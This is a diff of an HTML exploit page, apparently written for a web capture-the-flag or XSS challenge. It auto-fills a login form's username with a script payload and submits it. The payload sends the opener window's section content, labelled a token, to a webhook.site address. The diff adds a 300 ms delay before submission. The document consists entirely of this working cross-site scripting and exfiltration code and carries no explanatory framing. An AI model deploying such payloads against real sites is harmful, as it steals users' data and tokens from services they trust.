@@ -8,8 +8,11 @@
             <button class="mgb-1" type="submit">Login</button>
         </form>
         <script>
-            document.getElementById('username').value = `<script>location = 'https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?token='+window.opener.document.querySelector('section').innerHTML<\/script>`
-            document.forms[0].submit();
+            setTimeout(()=>{
+                document.getElementById('username').value = `<script>location = 'https://webhook.site/3efaae97-8a81-454e-81cd-1e019a8ce4e5?token='+window.opener.document.querySelector('section').innerHTML<\/script>`
+                document.forms[0].submit();
+            },300)
+            
         </script>
     </body>
 </html>
